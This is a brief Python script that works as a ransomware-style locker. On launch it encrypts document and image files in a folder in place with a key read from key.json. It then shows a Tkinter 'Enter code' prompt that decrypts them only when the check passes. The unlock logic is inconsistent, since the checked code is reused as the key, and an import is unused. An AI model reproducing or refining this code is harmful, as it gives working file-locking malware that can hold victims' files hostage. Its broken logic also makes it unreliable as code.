import os
import json
from cryptography.fernet import Fernet
from tkinter import *
from PyPDF2 import PdfFileReader, PdfFileWriter

def encrypt_file(filename, key):
    with open(filename, 'rb') as f:
        data = f.read()
    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)
    with open(filename, 'wb') as f:
        f.write(encrypted)

def decrypt_file(filename, key):
    with open(filename, 'rb') as f:
        data = f.read()
    fernet = Fernet(key)
    decrypted = fernet.decrypt(data)
    with open(filename, 'wb') as f:
        f.write(decrypted)

def encrypt_directory(directory, key):
    for filename in os.listdir(directory):
        if filename.endswith('.txt') or filename.endswith('.jpg') or filename.endswith('.png') or filename.endswith('.docx') or filename.endswith('.pdf') or filename.endswith('.odt'):
            encrypt_file(os.path.join(directory, filename), key)

def decrypt_directory(directory, key):
    for filename in os.listdir(directory):
        if filename.endswith('.txt') or filename.endswith('.jpg') or filename.endswith('.png') or filename.endswith('.docx') or filename.endswith('.pdf') or filename.endswith('.odt'):
            decrypt_file(os.path.join(directory, filename), key)

def check_code(code):
    with open('key.json', 'r') as f:
        data = json.load(f)
    return code in data

def on_submit():
    code = entry.get()
    if check_code(code):
        key = code
        decrypt_directory('./directory', key)
        print('Files decrypted successfully!')
    else:
        print('Wrong code!')

with open('key.json', 'r') as f:
    data = json.load(f)
key = data["key"]
encrypt_directory('./directory', key)

root = Tk()
root.title('Enter code')
label = Label(root, text='Enter code:')
label.pack()
entry = Entry(root)
entry.pack()
button = Button(root, text='Submit', command=on_submit)
button.pack()
root.mainloop()
